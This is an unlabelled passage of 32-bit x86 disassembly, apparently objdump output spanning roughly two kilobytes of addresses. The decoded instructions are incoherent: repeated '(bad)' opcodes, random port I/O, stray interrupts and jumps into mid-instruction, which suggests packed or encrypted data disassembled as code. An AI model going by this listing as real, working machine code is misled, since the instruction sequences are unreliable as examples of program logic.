  416ef8:	lods   eax,DWORD PTR ds:[esi]
  416ef9:	cli    
  416efa:	int    0xe4
  416efc:	scas   eax,DWORD PTR es:[edi]
  416efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416efe:	in     al,0xb5
  416f00:	pop    ebx
  416f01:	mov    bl,0x81
  416f03:	sub    al,0xa9
  416f05:	jns    0x416f08
  416f07:	jno    0x416f76
  416f09:	mov    DWORD PTR [ebx],edx
  416f0b:	mov    ah,0xdb
  416f0d:	dec    esi
  416f0e:	into   
  416f0f:	or     bh,BYTE PTR [esi+0x16580a11]
  416f15:	out    0xf1,al
  416f17:	fistp  QWORD PTR ds:0x9b13839a
  416f1d:	lods   eax,DWORD PTR ds:[esi]
  416f1e:	xchg   esi,eax
  416f1f:	sbb    eax,0xb33809c8
  416f24:	sub    BYTE PTR [edi-0x5df21079],ch
  416f2a:	adc    BYTE PTR [esi],dl
  416f2c:	das    
  416f2d:	mov    al,0x84
  416f2f:	daa    
  416f30:	or     eax,0x40238744
  416f35:	inc    edi
  416f36:	popf   
  416f37:	sahf   
  416f38:	repnz fstp DWORD PTR [ecx+0x7e081b8d]
  416f3f:	stc    
  416f40:	sbb    ch,BYTE PTR [esi]
  416f42:	inc    eax
  416f43:	xchg   edx,eax
  416f44:	xor    ecx,ebx
  416f46:	adc    BYTE PTR [ebp+0x52f741fb],ah
  416f4c:	repz mov ah,0x44
  416f4f:	and    eax,0x4b7cced8
  416f54:	xchg   esi,eax
  416f55:	and    eax,ebx
  416f57:	(bad)  
  416f58:	jmp    0x416f0d
  416f5a:	jg     0x416f40
  416f5c:	popf   
  416f5d:	mov    bl,0x74
  416f5f:	mov    DWORD PTR [esi-0x4b],ebx
  416f62:	jns    0x416fc1
  416f64:	push   0xe4d5d6aa
  416f69:	sbb    eax,0x216fc746
  416f6e:	ret    
  416f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f70:	mov    dh,0x73
  416f72:	xchg   edx,eax
  416f73:	pop    esp
  416f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f75:	mov    dh,0xe7
  416f77:	adc    al,BYTE PTR [esi]
  416f79:	adc    ebp,esp
  416f7b:	add    DWORD PTR [edi],edi
  416f7d:	adc    al,BYTE PTR [ebp-0x56]
  416f80:	jmp    0x416fbb
  416f82:	mov    esi,0x4e7ef2e8
  416f87:	mov    bh,0x3e
  416f89:	inc    ebp
  416f8a:	sbb    bl,BYTE PTR [bp+di-0xef0]
  416f8f:	rcr    BYTE PTR [edx-0x1c],1
  416f92:	sbb    al,0x8d
  416f94:	in     al,dx
  416f95:	push   cs
  416f96:	inc    esp
  416f97:	adc    bl,dl
  416f99:	pusha  
  416f9a:	pop    esp
  416f9b:	xor    al,0x94
  416f9d:	or     al,0x9f
  416f9f:	dec    ebp
  416fa0:	inc    eax
  416fa1:	or     al,0x75
  416fa3:	jge    0x416fb3
  416fa5:	out    dx,eax
  416fa6:	test   al,0x45
  416fa8:	int    0xe0
  416faa:	cld    
  416fab:	pop    ebx
  416fac:	inc    ecx
  416fad:	xor    BYTE PTR [ebp-0x26dcb559],dh
  416fb3:	or     ah,BYTE PTR [edx*4-0xdea7796]
  416fba:	sar    BYTE PTR [ecx+edx*2],0x3f
  416fbe:	mov    eax,ds:0x456e448b
  416fc3:	loope  0x41703e
  416fc5:	fadd   st,st(5)
  416fc7:	cmc    
  416fc8:	mov    edx,0x874b05e4
  416fcd:	mov    al,0x5e
  416fcf:	pushf  
  416fd0:	or     BYTE PTR [esi],cl
  416fd2:	and    edi,DWORD PTR [eax]
  416fd4:	xchg   ecx,eax
  416fd5:	adc    al,BYTE PTR [eax+0x26]
  416fd8:	pushf  
  416fd9:	push   edx
  416fda:	adc    DWORD PTR [eax-0x7c],0x95c5621b
  416fe1:	push   esi
  416fe2:	data16 test al,0x71
  416fe5:	das    
  416fe6:	cwde   
  416fe7:	mov    dl,dh
  416fe9:	sbb    DWORD PTR [edi+eiz*1],ecx
  416fec:	push   0xffffffcd
  416fee:	fstp   DWORD PTR gs:[edi-0x8]
  416ff2:	lods   al,BYTE PTR ss:[esi]
  416ff4:	or     DWORD PTR [ebp-0x60],ebp
  416ff7:	xor    eax,0xcb69f6e8
  416ffc:	mov    ebp,0x9e97d0cf
  417001:	xchg   edi,eax
  417002:	cmp    al,0xf5
  417004:	sub    ch,dh
  417006:	shr    DWORD PTR ds:0x69f634d7,0xb5
  41700d:	sub    BYTE PTR [edx+0x1bdb5e29],bl
  417013:	outs   dx,DWORD PTR ds:[esi]
  417014:	cld    
  417015:	sar    BYTE PTR [ecx+0x60],0x0
  417019:	sbb    DWORD PTR [esi-0x2d],edi
  41701c:	and    al,0x47
  41701e:	jl     0x417091
  417020:	outs   dx,BYTE PTR ds:[esi]
  417021:	pop    esp
  417022:	or     eax,0xb3676550
  417027:	xor    BYTE PTR [ecx+0x7c61cca5],bh
  41702d:	ss scas al,BYTE PTR es:[edi]
  41702f:	sbb    al,0xf4
  417031:	sti    
  417032:	int    0x15
  417034:	or     ecx,DWORD PTR [eax]
  417036:	in     al,0xbb
  417038:	aad    0xcb
  41703a:	(bad)  
  41703b:	shr    DWORD PTR [edx-0x18],cl
  41703e:	fnstsw WORD PTR [ebx]
  417040:	xor    BYTE PTR [ebx-0x2a],cl
  417043:	adc    BYTE PTR [edi+0x5036e3e7],al
  417049:	retf   0xb0a9
  41704c:	jbe    0x417034
  41704e:	call   0x3db4:0x139b1886
  417055:	jne    0x417096
  417057:	cmc    
  417058:	clc    
  417059:	push   ebp
  41705a:	jno    0x417047
  41705c:	mov    BYTE PTR [ebx+0x41d369d0],bl
  417062:	cmc    
  417063:	jp     0x417071
  417065:	and    eax,0x94ed8262
  41706a:	jp     0x4170a2
  41706c:	lock (bad) 
  41706e:	mov    BYTE PTR [ebx-0x64254be2],al
  417074:	mov    eax,0x17928bb5
  417079:	stc    
  41707a:	dec    esi
  41707b:	mov    edx,0xaec03a76
  417080:	pop    ds
  417081:	jne    0x4170f5
  417083:	call   0x1dfa022d
  417088:	dec    esp
  417089:	cmp    DWORD PTR [ebx+0x7a],ecx
  41708c:	mov    esi,0x9b571c78
  417091:	push   0x3e
  417093:	std    
  417094:	xchg   esi,eax
  417095:	ficom  DWORD PTR fs:[ebx-0x11]
  417099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41709a:	stos   DWORD PTR es:[edi],eax
  41709b:	push   0xffffff86
  41709d:	call   0xfff7:0x78f0f084
  4170a4:	cmp    DWORD PTR [edx+0xe0e41ad],0xccb3cf84
  4170ae:	adc    DWORD PTR [eax-0x41],esp
  4170b1:	dec    ecx
  4170b2:	dec    ebp
  4170b3:	inc    eax
  4170b4:	jge    0x4170f7
  4170b6:	or     DWORD PTR [esi],ecx
  4170b8:	pop    ebp
  4170b9:	add    ch,bh
  4170bb:	or     al,0x27
  4170bd:	in     eax,0x28
  4170bf:	ret    
  4170c0:	xlat   BYTE PTR ds:[ebx]
  4170c1:	mov    ecx,0xa2ab0b46
  4170c6:	xchg   ecx,eax
  4170c7:	dec    esi
  4170c8:	pop    es
  4170c9:	icebp  
  4170ca:	mul    BYTE PTR [edi-0x7cec64b5]
  4170d0:	aaa    
  4170d1:	inc    esp
  4170d2:	and    ebp,ecx
  4170d4:	mov    ch,0xae
  4170d6:	test   eax,0x8255d8aa
  4170db:	push   ss
  4170dc:	sbb    bl,bh
  4170de:	stos   BYTE PTR es:[edi],al
  4170df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170e0:	out    dx,eax
  4170e1:	cmp    al,bh
  4170e3:	int3   
  4170e4:	dec    eax
  4170e5:	pop    ecx
  4170e6:	out    0x9d,eax
  4170e8:	push   esi
  4170e9:	out    0xd1,eax
  4170eb:	xchg   BYTE PTR [esp+ecx*8+0x5ddba903],bh
  4170f2:	imul   esi,DWORD PTR [esi-0x4cda91d8],0xe9e474f6
  4170fc:	in     eax,0x88
  4170fe:	pop    ebx
  4170ff:	cmp    al,0x5a
  417101:	shl    DWORD PTR [edx],1
  417103:	cmp    al,0xb9
  417105:	daa    
  417106:	push   ebp
  417107:	add    DWORD PTR [eax+0x17954c8a],esi
  41710d:	(bad)  
  41710e:	leave  
  41710f:	xor    ebx,ecx
  417111:	adc    al,0xef
  417113:	or     DWORD PTR [esi-0x4cb353ef],edi
  417119:	cmp    BYTE PTR [ebx],al
  41711b:	xlat   BYTE PTR ds:[ebx]
  41711c:	xchg   ecx,eax
  41711d:	(bad)
  417122:	call   0x5ec3:0x6773d823
  417129:	cmp    BYTE PTR [ecx-0xd20ac65],ah
  41712f:	mov    ebx,0xb2fac5d2
  417134:	mov    DWORD PTR [esi+0x471de8b2],edx
  41713a:	mov    bp,0x56f5
  41713e:	call   0x5c5c:0x5d77f36e
  417145:	and    al,0xa8
  417147:	test   DWORD PTR ds:0x1b3d70b7,esp
  41714d:	push   es
  41714e:	mov    BYTE PTR [eax-0x22],bh
  417151:	xchg   esp,eax
  417152:	add    edi,ecx
  417154:	sub    al,0x46
  417156:	popf   
  417157:	mov    al,ds:0xad01bce1
  41715c:	dec    edi
  41715d:	adc    esi,DWORD PTR [edi+edi*1+0x5ef89e7]
  417164:	loopne 0x41714b
  417166:	sti    
  417167:	out    0x7f,eax
  417169:	clc    
  41716a:	jne    0x417188
  41716c:	mov    al,ds:0x3fbfe228
  417171:	mov    al,BYTE PTR [ebp-0x21]
  417174:	or     DWORD PTR [ecx-0x4e],edi
  417177:	mov    edx,0x4e468d01
  41717c:	lea    esi,[ebp-0x2e7ca109]
  417182:	add    eax,0xf2811e80
  417187:	adc    eax,0x2c9a7ea8
  41718c:	int    0x4f
  41718e:	out    0x67,eax
  417190:	mov    DWORD PTR [ecx-0x40c215b9],esi
  417196:	push   edx
  417197:	cmp    ecx,eax
  417199:	pop    es
  41719a:	jno    0x417154
  41719c:	clc    
  41719d:	fidivr WORD PTR [edx+ebp*2]
  4171a0:	inc    edx
  4171a1:	push   eax
  4171a2:	mov    ecx,0x15c73946
  4171a7:	mov    eax,ds:0x531d60d3
  4171ac:	int    0x44
  4171ae:	(bad)  
  4171af:	stc    
  4171b0:	ins    DWORD PTR es:[edi],dx
  4171b1:	jb     0x4171e1
  4171b3:	lock lock loop 0x4171f4
  4171b7:	ja     0x4171db
  4171b9:	cdq    
  4171ba:	adc    al,BYTE PTR [ebp-0x6]
  4171bd:	fld    TBYTE PTR [ebx-0x134db6a1]
  4171c3:	loopne 0x417188
  4171c5:	pop    esi
  4171c6:	mov    bl,0xc
  4171c8:	sbb    DWORD PTR [esi],edi
  4171ca:	test   eax,0xf78332da
  4171cf:	ss leave 
  4171d1:	add    DWORD PTR [ebp+0x7b],0xc596e547
  4171d8:	and    eax,0x550e4ab8
  4171dd:	daa    
  4171de:	(bad)  
  4171df:	push   ds
  4171e0:	pop    ds
  4171e1:	out    0x41,al
  4171e3:	or     BYTE PTR [ecx+0x2d],bh
  4171e6:	inc    ebp
  4171e7:	lds    esi,FWORD PTR [edi+0x26]
  4171ea:	out    dx,eax
  4171eb:	xchg   ebx,eax
  4171ec:	jmp    DWORD PTR [eax]
  4171ee:	mov    bh,0x47
  4171f0:	scas   eax,DWORD PTR es:[edi]
  4171f1:	leave  
  4171f2:	mov    ds:0x8df1e22b,al
  4171f7:	ins    BYTE PTR es:[edi],dx
  4171f8:	imul   DWORD PTR [ecx+0x6b53921c]
  4171fe:	out    0x44,eax
  417200:	in     eax,dx
  417201:	test   al,0xe6
  417204:	sbb    al,dh
  417206:	loope  0x41726b
  417208:	mov    BYTE PTR [esp],ah
  41720b:	sbb    DWORD PTR [eax],0x1a
  41720e:	mov    cs,WORD PTR [edx+edx*8]
  417211:	dec    edi
  417212:	mov    al,ds:0x3b34fc1a
  417217:	jae    0x4171d3
  417219:	sub    BYTE PTR [edx-0x5760b688],al
  41721f:	sub    bl,BYTE PTR [edx+0x1c]
  417222:	cmp    eax,0x2e5d8d17
  417227:	dec    eax
  417228:	fs jle 0x41723a
  41722b:	push   ss
  41722c:	inc    eax
  41722d:	cs (bad) 
  41722f:	mov    BYTE PTR [eax-0x687f6de4],bl
  417235:	jl     0x417209
  417237:	add    al,0x3c
  417239:	jo     0x4171dc
  41723b:	xchg   edx,eax
  41723c:	mov    al,ds:0x453d5162
  417241:	push   esp
  417242:	cmp    BYTE PTR [ebp+0x65],al
  417245:	add    al,0xb8
  417247:	inc    eax
  417248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417249:	push   eax
  41724a:	int3   
  41724b:	push   esp
  41724c:	sar    BYTE PTR ds:[edi+0x16],0x20
  417251:	and    DWORD PTR [eax],ecx
  417253:	cld    
  417254:	mov    eax,ds:0x3114dfc4
  417259:	push   ebp
  41725a:	call   0xd820e33b
  41725f:	repz addr16 mov ds:0xf45f,al
  417264:	jbe    0x417209
  417266:	ret    
  417267:	nop
  417268:	mov    ebx,0xb7cdad11
  41726d:	jg     0x417225
  41726f:	jle    0x41724e
  417271:	jo     0x417244
  417273:	inc    ecx
  417274:	stos   BYTE PTR es:[edi],al
  417275:	imul   esi,esi,0xffffffc8
  417278:	outs   dx,BYTE PTR ds:[esi]
  417279:	or     eax,0x8f42d0d9
  41727e:	push   ecx
  41727f:	retf   
  417280:	push   es
  417281:	sahf   
  417282:	xor    DWORD PTR [ebp+0x29],0x2405619e
  417289:	repnz fld TBYTE PTR [edi+0x41]
  41728d:	mov    ah,0xf6
  41728f:	inc    ebp
  417290:	adc    DWORD PTR [eax],0x5b743145
  417296:	shl    DWORD PTR [ecx],0x30
  417299:	aaa    
  41729a:	adc    ebp,eax
  41729c:	inc    esi
  41729d:	xchg   DWORD PTR [ebp+0x1a],edx
  4172a0:	sbb    DWORD PTR [ecx-0x55],ecx
  4172a3:	arpl   WORD PTR [edi+0xf],sp
  4172a6:	mov    WORD PTR [ecx],es
  4172a8:	xor    dl,al
  4172aa:	cdq    
  4172ab:	jg     0x417279
  4172ad:	jb     0x417253
  4172af:	mov    al,0xe5
  4172b1:	(bad)  
  4172b2:	mov    eax,ds:0x896623c0
  4172b7:	jo     0x41731b
  4172b9:	fcmovnbe st,st(4)
  4172bb:	mov    ebp,eax
  4172bd:	popa   
  4172be:	fnstsw WORD PTR [edx+0xf]
  4172c1:	(bad)  
  4172c3:	push   es
  4172c4:	in     al,0x15
  4172c6:	xchg   BYTE PTR [ecx+0x2979c12d],dl
  4172cc:	push   eax
  4172cd:	pusha  
  4172ce:	sbb    al,0xb4
  4172d0:	scas   al,BYTE PTR es:[edi]
  4172d1:	test   bh,cl
  4172d3:	push   edi
  4172d4:	dec    eax
  4172d5:	jmp    0x8ad058c5
  4172da:	jae    0x41726d
  4172dc:	jecxz  0x417265
  4172de:	pop    ss
  4172df:	sub    DWORD PTR ds:0xe1d1fed2,edx
  4172e5:	aas    
  4172e6:	and    BYTE PTR [edx-0x256aa770],bl
  4172ec:	mov    edi,0x73556987
  4172f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f2:	(bad)  
  4172f3:	mov    ah,0x97
  4172f5:	fidivr DWORD PTR cs:[ebp-0x5112b98e]
  4172fc:	cwde   
  4172fd:	pop    esp
  4172fe:	popa   
  4172ff:	lods   eax,DWORD PTR ds:[esi]
  417300:	clc    
  417301:	sub    dl,BYTE PTR [edx+ecx*2-0x2e79e41f]
  417308:	mov    DWORD PTR ds:0x486d71f4,0x726f445c
  417312:	fadd   DWORD PTR [ebx]
  417314:	mov    edi,0x6afe675d
  417319:	jl     0x417344
  41731b:	mov    ecx,0xf5ceaaa2
  417320:	jg     0x4172a5
  417322:	addr16 mov eax,0x5020ee0c
  417328:	mov    ds:0xb1756fd0,al
  41732d:	or     bh,BYTE PTR [edx+0x2c4b77d1]
  417333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417334:	scas   al,BYTE PTR es:[edi]
  417335:	xchg   ebx,eax
  417336:	jle    0x417352
  417338:	jmp    0xc56c9e70
  41733d:	sbb    edx,DWORD PTR [edx]
  41733f:	test   eax,0x5c1121e4
  417344:	or     dh,ch
  417346:	push   esi
  417347:	mov    ds:0xbe86a5ca,al
  41734c:	repz xor eax,edi
  41734f:	stos   DWORD PTR es:[edi],eax
  417350:	jmp    FWORD PTR [ebx-0x6b]
  417353:	(bad)  
  417354:	pop    edi
  417355:	dec    edx
  417356:	adc    al,0xf3
  417358:	jmp    0x41739d
  41735a:	pop    esi
  41735b:	(bad)  
  41735d:	inc    ebx
  41735e:	(bad)  [edx-0x142dcf89]
  417364:	fistp  WORD PTR [ebp*8+0x32dbf9da]
  41736b:	jge    0x417393
  41736d:	xchg   DWORD PTR [edi-0x43],ebp
  417370:	jmp    0x4173ef
  417372:	push   edi
  417373:	lea    edx,[eax-0x71b894bf]
  417379:	sbb    dl,dh
  41737b:	dec    ebp
  41737c:	aaa    
  41737d:	mov    dl,0xc4
  41737f:	adc    eax,0xfe440831
  417384:	(bad)  
  417386:	(bad)  
  417387:	or     eax,0xca486dd
  41738c:	call   0xb57e:0x9740f8e3
  417393:	in     eax,0x20
  417395:	sub    eax,0x7aac54ef
  41739a:	jmp    0xc661f1f3
  41739f:	mov    eax,0xc12ec9fe
  4173a4:	mov    eax,ds:0x8f28e7b6
  4173a9:	mov    esp,0x748af626
  4173ae:	out    0x84,eax
  4173b0:	fwait
  4173b1:	(bad)  
  4173b2:	mov    esi,0xaf85034b
  4173b7:	adc    dh,BYTE PTR [edx+0x5e]
  4173ba:	(bad)  
  4173bb:	fldlg2 
  4173bd:	sub    al,0x25
  4173bf:	xlat   BYTE PTR ds:[ebx]
  4173c0:	ja     0x41742c
  4173c2:	(bad)  
  4173c3:	jge    0x417382
  4173c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c6:	imul   edx,DWORD PTR [eax-0x35],0xffffffef
  4173ca:	ret    0xbda7
  4173cd:	adc    esi,DWORD PTR [edi]
  4173cf:	in     al,0x4e
  4173d1:	(bad)  
  4173d3:	jbe    0x41737e
  4173d5:	cmp    dh,dl
  4173d7:	leave  
  4173d8:	es test eax,0xf41bd0c5
  4173de:	push   0x8b17c6fc
  4173e3:	das    
  4173e4:	push   esp
  4173e5:	sbb    esp,eax
  4173e7:	mov    WORD PTR [edx-0x4df7cae0],fs
  4173ed:	mov    bh,0xa3
  4173ef:	pop    eax
  4173f0:	jns    0x4173b6
  4173f2:	mul    DWORD PTR [ecx]
  4173f4:	or     al,BYTE PTR [edx]
  4173f6:	arpl   sp,bx
  4173f8:	xchg   ecx,eax
  4173f9:	lahf   
  4173fa:	popa   
  4173fb:	and    bl,BYTE PTR [ebx+0x44dd6ac]
  417401:	out    0x41,al
  417403:	lea    ecx,[edx-0x19a065bb]
  417409:	sub    DWORD PTR [esi-0x27],edi
  41740c:	xlat   BYTE PTR ds:[ebx]
  41740d:	mov    ecx,0xdac472ac
  417412:	jge    0x417402
  417414:	mov    eax,ds:0x4b2b60e9
  417419:	dec    ebx
  41741a:	sub    al,BYTE PTR [ecx+edx*2]
  41741d:	mov    ch,0xe3
  41741f:	out    0xf4,eax
  417421:	adc    ebp,ebx
  417423:	pop    edi
  417424:	mov    ds:0xf6660708,eax
  417429:	ins    BYTE PTR es:[edi],dx
  41742a:	push   esp
  41742b:	fs push esi
  41742d:	jmp    0xc392:0x91b56ed1
  417434:	fidivr DWORD PTR ds:0x6bc68c61
  41743a:	nop
  41743b:	dec    ecx
  41743c:	popa   
  41743d:	cli    
  41743e:	call   0x3dfc7a56
  417443:	xor    esp,ebp
  417445:	test   al,0xa2
  417447:	pop    esi
  417448:	adc    al,dh
  41744a:	push   edx
  41744b:	jge    0x4174b4
  41744d:	xchg   DWORD PTR [eax-0x2d3a646e],esp
  417453:	or     eax,0xbf3968ab
  417458:	xor    BYTE PTR [ecx+0x70],bl
  41745b:	mov    ebx,0x46708c44
  417460:	clc    
  417461:	push   es
  417462:	inc    esp
  417463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417464:	mov    bh,BYTE PTR [ecx+0x7b]
  417467:	cli    
  417468:	stos   BYTE PTR es:[edi],al
  417469:	pop    ebx
  41746a:	lock dec ebx
  41746c:	pop    ebx
  41746d:	xor    eax,0x38c76370
  417472:	adc    edx,DWORD PTR [ecx+0x13]
  417475:	fnstsw WORD PTR [esi-0x29a9c29f]
  41747b:	or     bh,BYTE PTR [esi-0x60084b2e]
  417481:	jbe    0x41747b
  417483:	xchg   ecx,eax
  417484:	or     ch,bh
  417486:	push   eax
  417487:	xchg   ebx,eax
  417488:	shl    DWORD PTR [esi+eiz*8-0x5],0x73
  41748d:	mov    esp,0x437ab378
  417492:	mov    WORD PTR [edx+eiz*1-0x61],fs
  417496:	or     BYTE PTR [ecx-0x70704233],dh
  41749c:	inc    eax
  41749d:	dec    ebp
  41749e:	(bad)  
  41749f:	xor    eax,0xbd4ebfd9
  4174a4:	jnp    0x41742f
  4174a6:	sbb    esp,edi
  4174a8:	sub    DWORD PTR [esi+0x4e21e6cc],eax
  4174ae:	fstp   DWORD PTR [edx+0xb]
  4174b1:	scas   eax,DWORD PTR es:[edi]
  4174b2:	bound  edi,QWORD PTR [edi+edx*4+0x3]
  4174b6:	lahf   
  4174b7:	inc    edx
  4174b8:	jge    0x417475
  4174ba:	cmp    ebp,DWORD PTR [esi+0x59e1c466]
  4174c0:	gs or  eax,0x673836a7
  4174c6:	cmp    al,0x26
  4174c8:	or     al,0x33
  4174ca:	mov    ds:0x6b1dc7fc,al
  4174cf:	ss add eax,0x8a9b6493
  4174d5:	pop    edi
  4174d6:	popa   
  4174d7:	cmp    eax,0x9ac027c3
  4174dc:	ss dec edx
  4174de:	lock fimul DWORD PTR [edi+0x53d3220d]
  4174e5:	push   0x6b752c04
  4174ea:	jne    0x4174c3
  4174ec:	or     DWORD PTR [ebx+ebx*2],ebx
  4174ef:	stc    
  4174f0:	ins    BYTE PTR es:[edi],dx
  4174f1:	stos   BYTE PTR es:[edi],al
  4174f2:	mov    esi,0xc7b8973b
  4174f7:	lea    edi,[bx+di]
  4174fa:	nop
  4174fb:	sbb    ebx,DWORD PTR [edx-0x22]
  4174fe:	mov    edi,0xd185941a
  417503:	dec    ebx
  417504:	jb     0x4174e7
  417506:	in     eax,dx
  417507:	outs   dx,DWORD PTR ds:[esi]
  417508:	mov    WORD PTR [edx],?
  41750a:	mov    ds:0x48348493,al
  41750f:	xchg   edx,eax
  417510:	or     edi,edx
  417512:	inc    BYTE PTR [ebx]
  417514:	xchg   esi,eax
  417515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417516:	mov    ecx,0x35f76a6e
  41751b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41751c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41751e:	pushf  
  41751f:	fisttp WORD PTR [eax]
  417521:	xor    BYTE PTR [ecx],dl
  417523:	add    ah,BYTE PTR [ecx-0x50]
  417526:	mov    ebx,0x39802d47
  41752b:	jg     0x41757c
  41752d:	aad    0xb2
  41752f:	pop    edi
  417530:	sbb    ch,bl
  417532:	mov    dl,0x4e
  417534:	in     al,dx
  417535:	(bad)  
  417536:	(bad)  [eax]
  417538:	inc    ecx
  417539:	popf   
  41753a:	dec    ecx
  41753b:	fwait
  41753c:	outs   dx,BYTE PTR ds:[esi]
  41753d:	adc    bl,BYTE PTR [esi]
  41753f:	push   edi
  417540:	mov    DWORD PTR [ecx+0x6a],0x9f2b8f9f
  417547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417548:	sub    DWORD PTR [esi-0xf],ebx
  41754b:	sbb    eax,0x65b24918
  417550:	dec    esp
  417551:	out    0x17,al
  417553:	call   0xf061:0xa497593e
  41755a:	in     eax,0xbf
  41755c:	cmp    bl,BYTE PTR [ecx]
  41755e:	mov    esi,0x8f357f39
  417563:	pushf  
  417564:	jno    0x4175df
  417566:	cdq    
  417567:	jmp    DWORD PTR [ecx+0x632dc19d]
  41756d:	clc    
  41756e:	jae    0x41756d
  417570:	jmp    0x2e699fcc
  417575:	aad    0x31
  417577:	push   ebp
  417578:	inc    esp
  417579:	push   0x15
  41757b:	xchg   edx,eax
  41757c:	push   ds
  41757d:	retf   0x1ee4
  417580:	out    0x13,al
  417582:	ret    0xee13
  417585:	sub    BYTE PTR [eax],ch
  417587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417588:	popa   
  417589:	cwde   
  41758a:	and    bl,BYTE PTR [esi-0x475aa73]
  417590:	ret    
  417591:	dec    esi
  417592:	test   edi,edx
  417594:	in     eax,dx
  417595:	mov    bl,0x53
  417597:	mov    esp,0x36b20d2
  41759c:	xor    al,0x4
  41759e:	addr16 jns 0x4175bb
  4175a1:	shl    DWORD PTR [si-0x7c44],0x8b
  4175a7:	scas   al,BYTE PTR es:[edi]
  4175a8:	je     0x41756f
  4175aa:	xor    eax,0x5ea5fab0
  4175af:	mov    dh,0xc8
  4175b1:	dec    edi
  4175b2:	dec    esi
  4175b3:	sbb    edx,esi
  4175b5:	enter  0x1d07,0xe2
  4175b9:	aad    0xb0
  4175bb:	jae    0x417619
  4175bd:	xchg   edx,eax
  4175be:	(bad)  
  4175bf:	jp     0x41755c
  4175c1:	and    BYTE PTR [edx-0x67],dl
  4175c4:	add    bl,ch
  4175c6:	js     0x417610
  4175c8:	cwde   
  4175c9:	sbb    ecx,DWORD PTR [edi+0x4d2a0aed]
  4175cf:	fdiv   st,st(2)
  4175d1:	sahf   
  4175d2:	test   al,0x4e
  4175d4:	sbb    ecx,edx
  4175d6:	mov    cs,WORD PTR [eax-0x4a818cac]
  4175dc:	jge    0x417567
  4175de:	shl    edx,0x97
  4175e1:	clc    
  4175e2:	in     eax,0x6
  4175e4:	or     BYTE PTR [ecx-0x5719c84c],0xff
  4175eb:	xor    al,0x80
  4175ed:	or     cl,BYTE PTR [ebp-0x4]
  4175f0:	ss sahf 
  4175f2:	lea    ecx,[ebx-0x4cfd9207]
  4175f8:	lahf   
  4175f9:	xor    cl,ch
  4175fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175fc:	in     eax,0x56
  4175fe:	push   ecx
  4175ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417600:	pop    ecx
  417601:	cmp    ecx,DWORD PTR [esi]
  417603:	jmp    0x6ecb:0xfcfe8a21
  41760a:	jmp    0x141d3329
  41760f:	cmp    BYTE PTR [ebx+0x441ae676],0x84
  417616:	xchg   ecx,eax
  417617:	(bad)  [ecx]
  417619:	cmp    eax,0x5d11c56
  41761e:	(bad)  
  417620:	inc    edi
  417621:	cmp    eax,0x18d89098
  417626:	inc    eax
  417627:	cmp    al,0x8e
  417629:	(bad)  
  41762b:	mov    ch,0xa1
  41762d:	jle    0x41760f
  41762f:	fcom   DWORD PTR [ebp+0x40]
  417632:	add    esp,esp
  417634:	call   0x61e2:0xc9eea423
  41763b:	mov    ebx,gs
  41763d:	push   ebp
  41763e:	sub    al,0x84
  417640:	pop    ds
  417641:	cmp    esi,ebx
  417643:	push   es
  417644:	mov    bh,0x1c
  417646:	push   ecx
  417647:	lods   eax,DWORD PTR ds:[si]
  417649:	daa    
  41764a:	xchg   edi,eax
  41764b:	dec    edi
  41764c:	xchg   esi,eax
  41764d:	je     0x4176ad
  41764f:	ficom  WORD PTR [edi+ebx*4-0x511f031d]
  417656:	jb     0x417605
  417658:	(bad)  
  417659:	imul   eax,DWORD PTR cs:[esi],0x5c
  41765d:	or     edi,esp
  41765f:	rcr    DWORD PTR [esi-0x20],1
  417662:	inc    BYTE PTR [ecx+ebp*8-0x541c30b0]
  417669:	icebp  
  41766a:	sub    DWORD PTR [edx-0x4aedd684],ecx
  417670:	pop    ecx
  417671:	or     cl,ah
  417673:	jp     0x4175f5
  417675:	enter  0x4b88,0x72
  417679:	ficomp WORD PTR [eax]
  41767b:	pop    ebp
  41767c:	mov    ds:0x61db9ecd,al
  417681:	jg     0x4176c3
  417683:	loope  0x417690
  417685:	test   eax,0xc12f6423
  41768a:	addr16 (bad) 
  41768c:	mov    BYTE PTR [edx-0x61],bl
  41768f:	das    
  417690:	mov    cl,0x4a
  417692:	lock sbb BYTE PTR [ebx+esi*4],0x19
  417697:	les    edi,FWORD PTR [ecx]
  417699:	pop    eax
  41769a:	pop    ds
  41769b:	push   es
  41769c:	sti    
  41769d:	add    al,BYTE PTR [ecx-0x30]
  4176a0:	stos   DWORD PTR es:[edi],eax
  4176a1:	cmp    ch,BYTE PTR [eax]
  4176a3:	sbb    bh,BYTE PTR [ebx+0x2d6c1fe0]
  4176a9:	xor    bh,BYTE PTR [ebp-0x4f]
  4176ac:	enter  0x4d5b,0xa
  4176b0:	fistp  DWORD PTR [edi-0x10493d8c]
  4176b6:	mov    edx,0x80bc6359
  4176bb:	cmp    BYTE PTR [edx-0x6cbd123d],ah
  4176c1:	mov    edi,DWORD PTR [ebx]
  4176c3:	sbb    DWORD PTR [eax],edi
  4176c5:	sbb    eax,0x27433bc8
  4176ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176cb:	rcl    BYTE PTR [eax+ecx*1],cl
  4176ce:	lea    eax,[ebx+0x78829710]
  4176d4:	push   ecx
  4176d5:	sbb    DWORD PTR [edi+ecx*8],ecx
  4176d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176d9:	jecxz  0x417755
  4176db:	adc    DWORD PTR [edi+0x1],ebx
  4176de:	addr16 dec eax
  4176e0:	into   
  4176e1:	mov    edi,0x64c14324
  4176e6:	test   eax,0xbff39f4f
  4176eb:	add    esi,edi
  4176ed:	(bad)  
  4176ee:	pushf  
